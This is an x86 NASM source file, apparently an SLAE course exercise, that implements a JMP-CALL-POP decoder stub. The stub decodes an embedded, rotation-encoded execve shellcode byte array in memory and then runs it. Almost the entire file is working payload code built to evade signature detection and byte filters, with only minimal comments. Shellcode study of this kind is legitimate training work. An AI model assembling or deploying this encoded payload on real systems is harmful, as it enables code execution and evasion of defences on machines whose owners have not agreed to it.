;-------------------------------
; decoder-execve.nasm
; by Michael Born (@blu3gl0w13)
; September 5, 2016
; Student ID: SLAE-744
;-------------------------------

global _start

section .text


_start:

	; JMP CALL POP
	; to get address of our
	; encoded shellcode

	jmp shellcode


decoder:
	pop esi
	xor ecx, ecx
	mov cl, shellLen
	xor edx, edx	
decode:
	mov dl, byte [esi]
	rol dl, 0x2
	mov byte [esi], dl
	inc esi
	loop decode
	jmp short encShellcode
	
	
shellcode:

	call decoder
	encShellcode: db  0x4c,0x30,0x14,0x1a,0xcb,0xcb,0xdc,0x1a,0x1a,0xcb,0x98,0x5a,0x9b,0x62,0xf8,0x14,0x62,0xb8,0xd4,0x62,0x78,0x2c,0xc2,0x73,0x20
	shellLen: equ $-encShellcode
